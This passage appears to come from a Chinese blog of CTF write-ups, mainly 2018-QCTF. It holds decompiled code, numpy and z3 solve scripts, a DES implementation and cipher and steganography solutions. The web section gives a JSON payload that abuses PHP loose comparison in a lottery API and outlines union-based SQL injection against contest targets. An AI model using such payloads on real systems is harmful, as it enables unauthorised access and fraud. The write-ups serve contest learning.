= *((_DWORD *)*matrix + 5);  *((_DWORD *)*matrix + 5) = *(_DWORD *)v6;  *(_DWORD *)v6 = (_DWORD)v2;  v8 = matrix[1];  v7 = matrix[2];  LODWORD(v2) = *((_DWORD *)v8 + 2);  *((_DWORD *)v8 + 2) = *((_DWORD *)v7 + 1);  *((_DWORD *)v7 + 1) = (_DWORD)v2;  v9 = matrix[3];  v10 = matrix[1];  LODWORD(v2) = *((_DWORD *)v10 + 3);  *((_DWORD *)v10 + 3) = *((_DWORD *)v9 + 1);  *((_DWORD *)v9 + 1) = (_DWORD)v2;  v11 = matrix[4];  v12 = matrix[1];  LODWORD(v2) = *((_DWORD *)v12 + 4);  *((_DWORD *)v12 + 4) = *((_DWORD *)v11 + 1);  *((_DWORD *)v11 + 1) = (_DWORD)v2;  v13 = matrix[5];  v14 = matrix[1];  LODWORD(v2) = *((_DWORD *)v14 + 5);  *((_DWORD *)v14 + 5) = *((_DWORD *)v13 + 1);  *((_DWORD *)v13 + 1) = (_DWORD)v2;  v16 = matrix[2];  v15 = matrix[3];  LODWORD(v2) = *((_DWORD *)v16 + 3);  *((_DWORD *)v16 + 3) = *((_DWORD *)v15 + 2);  *((_DWORD *)v15 + 2) = (_DWORD)v2;  v17 = matrix[4];  v18 = matrix[2];  LODWORD(v2) = *((_DWORD *)v18 + 4);  *((_DWORD *)v18 + 4) = *((_DWORD *)v17 + 2);  *((_DWORD *)v17 + 2) = (_DWORD)v2;  v19 = matrix[5];  v20 = matrix[2];  LODWORD(v2) = *((_DWORD *)v20 + 5);  *((_DWORD *)v20 + 5) = *((_DWORD *)v19 + 2);  *((_DWORD *)v19 + 2) = (_DWORD)v2;  v22 = matrix[3];  v21 = matrix[4];  LODWORD(v2) = *((_DWORD *)v22 + 4);  *((_DWORD *)v22 + 4) = *((_DWORD *)v21 + 3);  *((_DWORD *)v21 + 3) = (_DWORD)v2;  v23 = matrix[5];  v24 = matrix[3];  LODWORD(v2) = *((_DWORD *)v24 + 5);  *((_DWORD *)v24 + 5) = *((_DWORD *)v23 + 3);  *((_DWORD *)v23 + 3) = (_DWORD)v2;  v26 = matrix[4];  v25 = matrix[5];  LODWORD(v2) = *((_DWORD *)v26 + 5);  *((_DWORD *)v26 + 5) = *((_DWORD *)v25 + 4);  *((_DWORD *)v25 + 4) = (_DWORD)v2;  return matrix;}</code></pre><p>再将两个矩阵相乘：</p><pre><code class="cpp">char *__fastcall matrix_inverse(char *matrix, char *data){  char *v2; // x19  char *v3; // x22  char *v4; // x20  char *v5; // x21  char *v6; // x0  __int64 i; // x8  char *v8; // x9  char *v9; // x10  __int64 j; // x11  v2 = matrix;  v3 = data;  v4 = (char *)malloc(48LL);  v5 = (char *)malloc(24LL);  *(_QWORD *)v4 = v5;  *((_QWORD *)v4 + 1) = malloc(24LL);  *((_QWORD *)v4 + 2) = malloc(24LL);  *((_QWORD *)v4 + 3) = malloc(24LL);  *((_QWORD *)v4 + 4) = malloc(24LL);  v6 = (char *)malloc(24LL);  i = 0LL;  *((_QWORD *)v4 + 5) = v6;  while ( 1 )  {    v9 = *(char **)&amp;v2[8 * i];    j = 0LL;    do    {      v8 = v3 + 72;      *(_DWORD *)&amp;v5[j] = *(_DWORD *)&amp;v8[j - 72] * *(_DWORD *)v9                        + *(_DWORD *)&amp;v8[j - 48] * *((_DWORD *)v9 + 1)                        + *(_DWORD *)&amp;v8[j - 24] * *((_DWORD *)v9 + 2)                        + *(_DWORD *)&amp;v8[j] * *((_DWORD *)v9 + 3)                        + *(_DWORD *)&amp;v8[j + 24] * *((_DWORD *)v9 + 4)                        + *(_DWORD *)&amp;v8[j + 48] * *((_DWORD *)v9 + 5);      j += 4LL;    }    while ( j != 24 );    if ( ++i == 6 )      break;    v5 = *(char **)&amp;v4[8 * i];  }  return v4;}</code></pre><p>那么这个过程用 numpy 就能解出来，解题脚本：</p><pre><code class="python">from numpy import *enc = [    0x0004E36B, 0x000362D6, 0x0003D5F1, 0x00063C4C, 0x00066AF7, 0x000418B7,    0x0004BE2E, 0x00035571, 0x0003DA7F, 0x00060D4A, 0x0006423A, 0x0003FC18,    0x0003A3B6, 0x0002FBEE, 0x00038F5B, 0x000509E4, 0x00057DAE, 0x00037D25,    0x0002E69A, 0x00028B2A, 0x000363B1, 0x00041DAE, 0x00049FA8, 0x0002D536,    0x0003B440, 0x00028D5B, 0x0003AF48, 0x00051F80, 0x00059294, 0x00030E5F,    0x00047CF0, 0x00034F47, 0x00033520, 0x000547A8, 0x000581E0, 0x0003E875]data = [    0x00000106, 0x00000245, 0x0000009C, 0x000001E2, 0x00000224, 0x0000027A,    0x00000112, 0x000000AE, 0x00000323, 0x000003C4, 0x00000370, 0x000000DC,    0x00000387, 0x0000001E, 0x000000B6, 0x000003D8, 0x0000035D, 0x0000013A,    0x000002B9, 0x00000162, 0x00000083, 0x00000225, 0x00000057, 0x0000018C,    0x00000109, 0x0000021B, 0x00000319, 0x000000EE, 0x000002C1, 0x000001D5,    0x0000023A, 0x0000019A, 0x00000145, 0x0000025E, 0x0000032A, 0x000001D6]trans_data = mat(data).reshape(6, 6)trans_enc = mat(enc).reshape(6, 6)trans = trans_enc * trans_data.Ires = trans.T.reshape(1, 36).tolist()[0]flag = &#39;&#39;for ch in res:    flag += chr(int(round(ch)))print(flag)</code></pre><p>因为还没学过线代，还没看懂的时候，硬生生现学现用 z3 把矩阵求逆的过程解出来了，所以顺便贴一波现学的 z3 脚本：</p><pre><code class="python">from z3 import *enc = [0x0004E36B, 0x000362D6, 0x0003D5F1, 0x00063C4C, 0x00066AF7, 0x000418B7, 0x0004BE2E, 0x00035571, 0x0003DA7F, 0x00060D4A, 0x0006423A, 0x0003FC18, 0x0003A3B6, 0x0002FBEE, 0x00038F5B, 0x000509E4, 0x00057DAE, 0x00037D25, 0x0002E69A, 0x00028B2A, 0x000363B1, 0x00041DAE, 0x00049FA8, 0x0002D536, 0x0003B440, 0x00028D5B, 0x0003AF48, 0x00051F80, 0x00059294, 0x00030E5F, 0x00047CF0, 0x00034F47, 0x00033520, 0x000547A8, 0x000581E0, 0x0003E875]data = [0x00000106, 0x00000245, 0x0000009C, 0x000001E2, 0x00000224, 0x0000027A, 0x00000112, 0x000000AE, 0x00000323, 0x000003C4, 0x00000370, 0x000000DC, 0x00000387, 0x0000001E, 0x000000B6, 0x000003D8, 0x0000035D, 0x0000013A, 0x000002B9, 0x00000162, 0x00000083, 0x00000225, 0x00000057, 0x0000018C, 0x00000109, 0x0000021B, 0x00000319, 0x000000EE, 0x000002C1, 0x000001D5, 0x0000023A, 0x0000019A, 0x00000145, 0x0000025E, 0x0000032A, 0x000001D6]i = 0res = &#39;&#39;while(1):    s = Solver()    n0 = Int(&#39;n0&#39;)    n1 = Int(&#39;n1&#39;)    n2 = Int(&#39;n2&#39;)    n3 = Int(&#39;n3&#39;)    n4 = Int(&#39;n4&#39;)    n5 = Int(&#39;n5&#39;)    s.add(enc[i * 6 + 0] == n0 * data[0] + n1 * data[6] + n2 * data[12] + n3 * data[18] + n4 * data[24] + n5 * data[30])    s.add(enc[i * 6 + 1] == n0 * data[1] + n1 * data[7] + n2 * data[13] + n3 * data[19] + n4 * data[25] + n5 * data[31])    s.add(enc[i * 6 + 2] == n0 * data[2] + n1 * data[8] + n2 * data[14] + n3 * data[20] + n4 * data[26] + n5 * data[32])    s.add(enc[i * 6 + 3] == n0 * data[3] + n1 * data[9] + n2 * data[15] + n3 * data[21] + n4 * data[27] + n5 * data[33])    s.add(enc[i * 6 + 4] == n0 * data[4] + n1 * data[10] + n2 * data[16] + n3 * data[22] + n4 * data[28] + n5 * data[34])    s.add(enc[i * 6 + 5] == n0 * data[5] + n1 * data[11] + n2 * data[17] + n3 * data[23] + n4 * data[29] + n5 * data[35])    s.check()    print s.model()    if i == 5:        break    i += 1</code></pre><h1 id="参考网站"><a href="#参考网站" class="headerlink" title="参考网站"></a>参考网站</h1><p><a href="http://yugod.xmutsec.com/index.php/2018/08/10/42.html" target="_blank" rel="noopener">http://yugod.xmutsec.com/index.php/2018/08/10/42.html</a><br><a href="https://www.jianshu.com/p/028c0c6270c3" target="_blank" rel="noopener">https://www.jianshu.com/p/028c0c6270c3</a><br><a href="https://github.com/krx/CTF-Writeups/tree/master/CSAW%2016%20Quals/for150%20-%20Yaar%20Haar%20Fiddle%20Dee%20Dee" target="_blank" rel="noopener">https://github.com/krx/CTF-Writeups/tree/master/CSAW%2016%20Quals/for150%20-%20Yaar%20Haar%20Fiddle%20Dee%20Dee</a><br><a href="https://www.xctf.org.cn/library/details/9ab7dca891b9e53206b9aec7ab13ac9a95fbf66d/?from=groupmessage&amp;isappinstalled=0" target="_blank" rel="noopener">https://www.xctf.org.cn/library/details/9ab7dca891b9e53206b9aec7ab13ac9a95fbf66d/?from=groupmessage&amp;isappinstalled=0</a><br><a href="https://www.jianshu.com/p/110f715c210f" target="_blank" rel="noopener">https://www.jianshu.com/p/110f715c210f</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>wp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2018-QCTF</title>
    <link href="/2018/07/21/2018-QCTF/"/>
    <url>/2018/07/21/2018-QCTF/</url>
    
    <content type="html"><![CDATA[<p>其实大部分是看着大佬 wp 的复现。感觉自己实力还是欠缺很多。</p><a id="more"></a><h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="picture"><a href="#picture" class="headerlink" title="picture"></a>picture</h2><p>通过 stegsolve 判断出存在最低位隐写。使用 lsb 工具解出密文，为一段加密函数：</p><pre><code class="python">#_*_ coding:utf-8 _*_import reimport sysip=  (58, 50, 42, 34, 26, 18, 10, 2,      60, 52, 44, 36, 28, 20, 12, 4,      62, 54, 46, 38, 30, 22, 14, 6,      64, 56, 48, 40, 32, 24, 16, 8,      57, 49, 41, 33, 25, 17, 9 , 1,      59, 51, 43, 35, 27, 19, 11, 3,      61, 53, 45, 37, 29, 21, 13, 5,      63, 55, 47, 39, 31, 23, 15, 7)ip_1=(40, 8, 48, 16, 56, 24, 64, 32,      39, 7, 47, 15, 55, 23, 63, 31,      38, 6, 46, 14, 54, 22, 62, 30,      37, 5, 45, 13, 53, 21, 61, 29,      36, 4, 44, 12, 52, 20, 60, 28,      35, 3, 43, 11, 51, 19, 59, 27,      34, 2, 42, 10, 50, 18, 58, 26,      33, 1, 41,  9, 49, 17, 57, 25)e  =(32, 1,  2,  3,  4,  5,  4,  5,       6, 7,  8,  9,  8,  9, 10, 11,      12,13, 12, 13, 14, 15, 16, 17,      16,17, 18, 19, 20, 21, 20, 21,      22, 23, 24, 25,24, 25, 26, 27,      28, 29,28, 29, 30, 31, 32,  1)p=(16,  7, 20, 21, 29, 12, 28, 17,     1, 15, 23, 26,  5, 18, 31, 10,     2,  8, 24, 14, 32, 27,  3,  9,     19, 13, 30, 6, 22, 11,  4,  25)s=[ [[14, 4, 13,  1,  2, 15, 11,  8,  3, 10,  6, 12,  5,  9,  0,  7],     [0, 15,  7,  4, 14,  2, 13,  1, 10,  6, 12, 11,  9,  5,  3,  8],     [4,  1, 14,  8, 13,  6,  2, 11, 15, 12,  9,  7,  3, 10,  5,  0],     [15, 12,  8,  2,  4,  9,  1,  7,  5, 11,  3, 14, 10,  0,  6, 13]],     [[15,  1,  8, 14,  6, 11,  3,  4,  9,  7,  2, 13, 12,  0,  5, 10],     [3, 13,  4,  7, 15,  2,  8, 14, 12,  0,  1, 10,  6,  9, 11,  5],     [0, 14,  7, 11, 10,  4, 13,  1,  5,  8, 12,  6,  9,  3,  2, 15],     [13,  8, 10,  1,  3, 15,  4,  2, 11,  6,  7, 12,  0,  5, 14,  9]],     [[10,  0,  9, 14,  6,  3, 15,  5,  1, 13, 12,  7, 11,  4,  2,  8],     [13,  7,  0,  9,  3,  4,  6, 10,  2,  8,  5, 14, 12, 11, 15,  1],     [13,  6,  4,  9,  8, 15,  3,  0, 11,  1,  2, 12,  5, 10, 14,  7],     [1, 10, 13,  0,  6,  9,  8,  7,  4, 15, 14,  3, 11,  5,  2, 12]],    [[7, 13, 14,  3,  0,  6,  9, 10,  1,  2,  8,  5, 11,  12,  4, 15],     [13,  8, 11,  5,  6, 15,  0,  3,  4,  7,  2, 12,  1, 10, 14,9],     [10,  6,  9,  0, 12, 11,  7, 13, 15,  1,  3, 14,  5,  2,  8,  4],     [3, 15,  0,  6, 10,  1, 13,  8,  9,  4,  5, 11, 12,  7,  2, 14]],    [[2, 12,  4,  1,  7, 10, 11,  6,  8,  5,  3, 15, 13,  0, 14,  9],     [14, 11,  2, 12,  4,  7, 13,  1,  5,  0, 15, 10,  3,  9,  8,  6],     [4,  2,  1, 11, 10, 13,  7,  8, 15,  9, 12,  5,  6,  3,  0, 14],     [11,  8, 12,  7,  1, 14,  2, 13,  6, 15,  0,  9, 10,  4,  5,  3]],    [[12,  1, 10, 15,  9,  2,  6,  8,  0, 13,  3,  4, 14,  7,  5, 11],     [10, 15,  4,  2,  7, 12,  9,  5,  6,  1, 13, 14,  0, 11,  3,  8],     [9, 14, 15,  5,  2,  8, 12,  3,  7,  0,  4, 10,  1, 13, 11,  6],     [4,  3,  2, 12,  9,  5, 15, 10, 11, 14,  1,  7,  6,  0,  8, 13]],    [[4, 11,  2, 14, 15,  0,  8, 13,  3, 12,  9,  7,  5, 10,  6,  1],     [13,  0, 11,  7,  4,  9,  1, 10, 14,  3,  5, 12,  2, 15,  8,  6],     [1,  4, 11, 13, 12,  3,  7, 14, 10, 15,  6,  8,  0,  5,  9,  2],     [6, 11, 13,  8,  1,  4, 10,  7,  9,  5,  0, 15, 14,  2,  3, 12]],   [[13,  2,  8,  4,  6, 15, 11,  1, 10,  9,  3, 14,  5,  0, 12,  7],     [1, 15, 13,  8, 10,  3,  7,  4, 12,  5,  6, 11,  0, 14,  9,  2],     [7, 11,  4,  1,  9, 12, 14,  2,  0,  6, 10, 13, 15,  3,  5,  8],     [2,  1, 14,  7,  4, 10,  8, 13, 15, 12,  9,  0,  3,  5,  6, 11]]]pc1=(57, 49, 41, 33, 25, 17,  9,       1, 58, 50, 42, 34, 26, 18,      10,  2, 59, 51, 43, 35, 27,      19, 11,  3, 60, 52, 44, 36,      63, 55, 47, 39, 31, 23, 15,       7, 62, 54, 46, 38, 30, 22,      14,  6, 61, 53, 45, 37, 29,      21, 13,  5, 28, 20, 12, 4);pc2= (14, 17, 11, 24,  1,  5,  3, 28,      15,  6, 21, 10, 23, 19, 12,  4,      26,  8, 16,  7, 27, 20, 13,  2,      41, 52, 31, 37, 47, 55, 30, 40,      51, 45, 33, 48, 44, 49, 39, 56,      34, 53, 46, 42, 50, 36, 29, 32)d = (  1,  1,  2,  2,  2,  2,  2,  2, 1, 2, 2, 2, 2, 2, 2, 1)__all__=[&#39;desencode&#39;]class DES():  def __init__(self):    pass  def code(self,from_code,key,code_len,key_len):    output=&quot;&quot;    trun_len=0    code_string=self._functionCharToA(from_code,code_len)    code_key=self._functionCharToA(key,key_len)    if code_len%16!=0:      real_len=(code_len/16)*16+16    else:      real_len=code_len    if key_len%16!=0:      key_len=(key_len/16)*16+16    key_len*=4    trun_len=4*real_len    for i in range(0,trun_len,64):      run_code=code_string[i:i+64]      l=i%key_len    run_key=code_key[l:l+64]            run_code= self._codefirstchange(run_code)            run_key= self._keyfirstchange(run_key)            for j in range(16):                code_r=run_code[32:64]                code_l=run_code[0:32]                run_code=code_r                code_r= self._functionE(code_r)                key_l=run_key[0:28]                key_r=run_key[28:56]                key_l=key_l[d[j]:28]+key_l[0:d[j]]                key_r=key_r[d[j]:28]+key_r[0:d[j]]                run_key=key_l+key_r                key_y= self._functionKeySecondChange(run_key)                code_r= self._codeyihuo(code_r,key_y)                code_r= self._functionS(code_r)                code_r= self._functionP(code_r)                code_r= self._codeyihuo(code_l,code_r)                run_code+=code_r            code_r=run_code[32:64]            code_l=run_code[0:32]            run_code=code_r+code_l            output+=self._functionCodeChange(run_code)        return output    def _codeyihuo(self,code,key):        code_len=len(key)        return_list=&#39;&#39;        for i in range(code_len):            if code[i]==key[i]:                return_list+=&#39;0&#39;            else:                return_list+=&#39;1&#39;        return return_list    def _codefirstchange(self,code):        changed_code=&#39;&#39;        for i in range(64):            changed_code+=code[ip[i]-1]        return changed_code    def _keyfirstchange (self,key):        changed_key=&#39;&#39;        for i in range(56):            changed_key+=key[pc1[i]-1]        return changed_key    def _functionCodeChange(self, code):        lens=len(code)/4        return_list=&#39;&#39;        for i in range(lens):            list=&#39;&#39;            for j in range(4):                list+=code[ip_1[i*4+j]-1]            return_list+=&quot;%x&quot; %int(list,2)        return return_list    def _functionE(self,code):        return_list=&#39;&#39;        for i in range(48):            return_list+=code[e[i]-1]        return return_list    def _functionP(self,code):        return_list=&#39;&#39;        for i in range(32):            return_list+=code[p[i]-1]        return return_list    def _functionS(self, key):        return_list=&#39;&#39;        for i in range(8):            row=int( str(key[i*6])+str(key[i*6+5]),2)            raw=int(str( key[i*6+1])+str(key[i*6+2])+str(key[i*6+3])+str(key[i*6+4]),2)            return_list+=self._functionTos(s[i][row][raw],4)        return return_list    def _functionKeySecondChange(self,key):        return_list=&#39;&#39;        for i in range(48):            return_list+=key[pc2[i]-1]        return return_list    def _functionCharToA(self,code,lens):        return_code=&#39;&#39;        lens=lens%16        for key in code:            code_ord=int(key,16)            return_code+=self._functionTos(code_ord,4)        if lens!=0:            return_code+=&#39;0&#39;*(16-lens)*4        return return_code    def _functionTos(self,o,lens):        return_code=&#39;&#39;        for i in range(lens):            return_code=str(o&gt;&gt;i &amp;1)+return_code        return return_codedef tohex(string):    return_string=&#39;&#39;    for i in string:        return_string+=&quot;%02x&quot;%ord(i)    return return_stringdef tounicode(string):    return_string=&#39;&#39;    string_len=len(string)    for i in range(0,string_len,2):        return_string+=chr(int(string[i:i+2],16))    return return_stringdef desencode(from_code,key):    from_code=tohex(from_code)    key=tohex(key)    des=DES()    key_len=len(key)    string_len=len(from_code)    if string_len&lt;1 or key_len&lt;1:    print &#39;error input&#39;        return False    key_code= des.code(from_code,key,string_len,key_len)    return key_codeif __name__  == &#39;__main__&#39;:    if(desencode(sys.argv[1],&#39;mtqVwD4JNRjw3bkT9sQ0RYcZaKShU4sf&#39;)==&#39;e3fab29a43a70ca72162a132df6ab532535278834e11e6706c61a1a7cefc402c8ecaf601d00eee72&#39;):        print &#39;correct.&#39;    else:        print &#39;try again.&#39;</code></pre><p>解出来之后发现应该是 DES，但无从下手。后来看了<a href="https://ihomura.cn/2018/07/25/WriteUp-QCTF-keyword-picture/" target="_blank" rel="noopener">孔师傅的 wp</a>，一惊居然还有这种骚操作。</p><p>顺便记录一下 <code>__all__</code> 在 python 中：</p><pre><code>The only solution is for the package author to provide an explicit index of the package. The import statement uses the following convention: if a package’s init.py code defines a list named all, it is taken to be the list of module names that should be imported when from package import * is encountered. It is up to the package author to keep this list up-to-date when a new version of the package is released. Package authors may also decide not to support it, if they don’t see a use for importing * from their package.</code></pre><p>最后用<a href="https://github.com/liupengs/DES_Python/blob/master/des.py" target="_blank" rel="noopener">搜到的脚本</a>解密：</p><pre><code class="shell">$ python des_1.pyDES 解密请输入密文（长度不限）:e3fab29a43a70ca72162a132df6ab532535278834e11e6706c61a1a7cefc402c8ecaf601d00eee72请输入密钥（长度不限）:mtqVwD4JNRjw3bkT9sQ0RYcZaKShU4sfQCTF{eCy0AALMDH9rLoBnWnTigXpYPkgU0sU4}按确定退出</code></pre><h2 id="Noise"><a href="#Noise" class="headerlink" title="Noise"></a>Noise</h2><p>拿到一个 <code>Noise.wav</code>，发现是 <code>my little pony theme song</code>。尝试用 <code>mp3stego</code> 后无果。再反复听了很多次，发现有一些噪音夹杂在里面。</p><p>看一下 hint，个人认为这里最关键的是 hint2，需要了解通过消除伴奏获得人声的原理。</p><p><img src="/pics/2018-QCTF/1.png" srcset="/img/loading.gif" alt></p><p>关于原理，利用声波叠加干涉消除原声，当声波的相位差达到 180 度的时候，就可以达到消音的效果：</p><p><img src="/pics/2018-QCTF/2.png" srcset="/img/loading.gif" alt></p><p>跟着<a href="https://www.bilibili.com/video/av560712?spm_id_from=333.338.__bofqi.15" target="_blank" rel="noopener">教程</a>学会怎么使用 <code>Adobe Audition</code>，使声波相位差达到 180 度。</p><p>要提取出噪音，我们要做的就是从网上下载原版的 <code>my little pony theme song</code>，然后将 <code>Noise.wav</code> 和它的相位差调整为 180 度，就可以提取出噪音。</p><p><img src="/pics/2018-QCTF/3.png" srcset="/img/loading.gif" alt></p><p>关于这段噪音的话，和<strong>慢扫描电视</strong>有关。利用软件 <code>MMSSTV</code>，最后得到 flag。</p><p><img src="/pics/2018-QCTF/4.png" srcset="/img/loading.gif" alt></p><h2 id="X-man-Keyword"><a href="#X-man-Keyword" class="headerlink" title="X-man-Keyword"></a>X-man-Keyword</h2><p>也是 lsb。</p><p><img src="/pics/2018-QCTF/5.png" srcset="/img/loading.gif" alt></p><p>密码为图片中的 <code>lovekfc</code>。</p><p><img src="/pics/2018-QCTF/6.png" srcset="/img/loading.gif" alt></p><p>通过提示，将 <code>LOVEKFC</code> 作为关键字提到最前面，和正常顺序的英文字母进行置换。</p><pre><code class="plain">PVSF{vVckHejqBOVX9C1c13GFfkHJrjIQeMwf}LOVEKFCABDGHIJMNPQRSTUWXYZABCDEFGHIJKLMNOPQRSTUVWXYZQCTF...// 容易发现前四位正好是QCTF</code></pre><p>写一下脚本跑出结果：</p><pre><code class="cpp">#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;ctype.h&gt;int main() {    char s1[27] = &quot;lovekfcabdghijmnpqrstuwxyz&quot;;    char s2[27] = &quot;abcdefghijklmnopqrstuvwxyz&quot;;    char s3[27] = &quot;LOVEKFCABDGHIJMNPQRSTUWXYZ&quot;;    char s4[27] = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;    char ans[39] = &quot;PVSF{vVckHejqBOVX9C1c13GFfkHJrjIQeMwf}&quot;;    for(int i = 0; i &lt; strlen(ans); i++) {        if(islower(ans[i])) {            for(int j = 0; j &lt; strlen(s1); j++) {                if(ans[i] == s1[j]) {                    ans[i] = s2[j];                    break;                }            }        } else if(isupper(ans[i])) {            for(int j = 0; j &lt; strlen(s3); j++) {                if(ans[i] == s3[j]) {                    ans[i] = s4[j];                    break;                }            }        } else {            continue;        }    }    printf(&quot;%s&quot;, ans);    return 0;}</code></pre><p><img src="/pics/2018-QCTF/7.png" srcset="/img/loading.gif" alt></p><h2 id="X-man-A-face"><a href="#X-man-A-face" class="headerlink" title="X-man-A face"></a>X-man-A face</h2><p>补全二维码定位符，扫出一串类似 base64 的密文。</p><p><img src="/pics/2018-QCTF/8.png" srcset="/img/loading.gif" alt></p><p>经过尝试，通过 base32 解码得到 flag。</p><p><img src="/pics/2018-QCTF/9.png" srcset="/img/loading.gif" alt></p><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="Lottery"><a href="#Lottery" class="headerlink" title="Lottery"></a>Lottery</h2><p>通过 GitHack 拿到源码，在 api.php 中：</p><pre><code class="php">function buy($req){    require_registered();    require_min_money(2);    $money = $_SESSION[&#39;money&#39;];    $numbers = $req[&#39;numbers&#39;];    $win_numbers = random_win_nums();    $same_count = 0;    for($i=0; $i&lt;7; $i++){        if($numbers[$i] == $win_numbers[$i]){            $same_count++;        }    }</code></pre><p><code>$numbers</code> 即用户输入的数字，<code>$win_numbers</code> 即随机生成的数字。根据 PHP 弱类型比较，例如 <code>TRUE</code> 和 <code>1</code> 和 <code>&quot;1&quot;</code> 相等，构造 <code>&quot;action&quot;:&quot;buy&quot;,&quot;numbers&quot;:[true,true,true,true,true,true,true]</code> 即可中最高奖，得到 flag。</p><h2 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h2><p>直接用联合注入判断出列数为三列后，就开始走流程 emmm。</p><p><img src="/pics/2018-QCTF/10.png" srcset="/img/loading.gif" alt></p><p><img src="/pics/2018-QCTF/11.png" srcset="/img/loading.gif" alt></p><p>显而易见 flag 应该在 <code>secret_table</code> 中。</p><p><img src="/pics/2018-QCTF/12.png" srcset="/img/loading.gif" alt></p><p>在 <code>fl4g</code> 列中得到 flag：</p><p><img src="/pics/2018-QCTF/13.png" srcset="/img/loading.gif" alt></p><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="Xman-babymips"><a href="#Xman-babymips" class="headerlink" title="Xman-babymips"></a>Xman-babymips</h2><p>mips 逆向，看一下 <a href="https://bestwing.me/mips-decompiler-retdec-install-guide.html" target="_blank" rel="noopener">swing 的博客</a>，安装一波 retdec 来反编译。</p><p>反编译出几个关键函数：</p><ul><li>check 函数：</li></ul><pre><code class="cpp">//// This file was generated by the Retargetable Decompiler// Website: https://retdec.com// Copyright (c) 2019 Retargetable Decompiler &lt;info@retdec.com&gt;//#include &lt;stdbool.h&gt;#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;// ------------------- Function Prototypes --------------------int32_t puts(char * a1);int32_t strlen(char * a1);int32_t strncmp(char * a1, char * a2, int32_t a3);int32_t sub_4007F0(char * a1);// --------------------- Global Variables ---------------------char * g1 = &quot;\x52\xfd\x16\xa4\x89\xbd\x92\x80\x13\x41\x54\xa0\x8d\x45\x18\x81\xde\xfc\x95\xf0\x16\x79\x1a\x15\x5b\x75\x1f&quot;;// ------------------------ Functions -------------------------// Address range: 0x4007f0 - 0x4009a8int32_t sub_4007F0(char * a1) {    int32_t v1 = (int32_t)a1; // 0x400800    char * str = (char *)v1; // 0x400800    int32_t puts_rc;    if (strlen(str) &lt;= 5) {        // 0x400934        if (strncmp((char *)(v1 + 5), (char *)&amp;g1, 27) == 0) {            // 0x400964            puts_rc = puts(&quot;Right!&quot;);            // branch -&gt; 0x40098c        } else {            // 0x40097c            puts_rc = puts(&quot;Wrong!&quot;);            // branch -&gt; 0x40098c        }        // 0x40098c        return puts_rc;    }    int32_t v2 = 5;    while (true) {        char * v3 = (char *)(v2 + v1); // 0x4008a8        int32_t v4 = (int32_t)*v3; // 0x4008a8        char v5;        if (v2 % 2 == 0) {            char v6 = *v3; // 0x4008cc            v5 = (int32_t)v6 / 64 | 0x4000000 * v4 / 0x1000000;            // branch -&gt; 0x400900        } else {            // 0x400828            v5 = 64 * (int32_t)*v3 | v4 / 4;            // branch -&gt; 0x400900        }        // 0x400900        *v3 = v5;        int32_t v7 = v2 + 1; // 0x400908        if (v7 &gt;= strlen(str)) {            // break -&gt; 0x400934            break;        }        v2 = v7;        // continue -&gt; 0x400814    }    // 0x400934    if (strncmp((char *)(v1 + 5), (char *)&amp;g1, 27) == 0) {        // 0x400964        puts_rc = puts(&quot;Right!&quot;);        // branch -&gt; 0x40098c    } else {        // 0x40097c        puts_rc = puts(&quot;Wrong!&quot;);        // branch -&gt; 0x40098c    }    // 0x40098c    return puts_rc;}// --------------------- Meta-Information ---------------------// Detected compiler/packer: gcc (7.3.0)// Detected functions: 1// Decompilation date: 2019-01-23 16:29:29</code></pre><p>逻辑就是先判断奇偶，如果为奇数则将字符的高 6 位作为低 6 位，低 2 位作为高 2 位；反之为偶数，则字符的低 6 位作为高 6 位，高 2 位作为低 2 位。最后和 <code>g1</code> check 一下。</p><ul><li>main 函数在这里：</li></ul><pre><code class="cpp">//// This file was generated by the Retargetable Decompiler// Website: https://retdec.com// Copyright (c) 2019 Retargetable Decompiler &lt;info@retdec.com&gt;//#include &lt;stdint.h&gt;#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;// ------------------- Function Prototypes --------------------int32_t printf(char * a1);int32_t puts(char * a1);int32_t scanf(char * a1);void setbuf(int32_t a1, char * a2);int32_t strncmp(char * a1, char * a2, int32_t a3);int32_t sub_4007F0(int32_t a1);int32_t sub_4009A8(void);// --------------------- Global Variables ---------------------int32_t stdin = 0;int32_t stdout = 0;// ------------------------ Functions -------------------------// Address range: 0x4009a8 - 0x400af8int32_t sub_4009A8(void) {    // 0x4009a8    setbuf(stdout, NULL);    setbuf(stdin, NULL);    printf(&quot;Give me your flag:&quot;);    scanf(&quot;%32s&quot;);    int32_t v1 = 0; // bp-48    int32_t v2 = 0; // 0x400a58    char * v3 = (char *)((int32_t)&amp;v1 + 4 + v2); // 0x400a28    *v3 = (char)((int32_t)*v3 ^ 32 - v2);    int32_t v4 = v1 + 1; // 0x400a70    v1 = v4;    // branch -&gt; 0x400a1c    while (v4 &lt; 32) {        // 0x400a1c        v2 = v4;        v3 = (char *)((int32_t)&amp;v1 + 4 + v2);        *v3 = (char)((int32_t)*v3 ^ 32 - v2);        v4 = v1 + 1;        v1 = v4;        // continue -&gt; 0x400a1c    }    int32_t str = 0; // bp-44    int32_t puts_rc;    if (strncmp((char *)&amp;str, &quot;Q|j{g&quot;, 5) == 0) {        // 0x400ab4        puts_rc = sub_4007F0((int32_t)&amp;str);        // branch -&gt; 0x400adc    } else {        // 0x400acc        puts_rc = puts(&quot;Wrong&quot;);        // branch -&gt; 0x400adc    }    // 0x400adc    return puts_rc;}// --------------------- Meta-Information ---------------------// Detected compiler/packer: gcc (7.3.0)// Detected functions: 1// Decompilation date: 2019-01-23 16:29:58</code></pre><p>main 中先输入字符串，然后将字符串中的每个字符依次与 <code>32-i</code> 异或，前五位与 <code>Q|j{g</code> 比较，之后将字符串作为参数调用上一个 check 函数。</p><p>由于之前的奇偶难以判断，所以采用爆破的方式。用 python 写出爆破脚本：</p><pre><code class="python">#!/usr/bin/env pythonenc1 = &#39;Q|j{g&#39;enc2 = 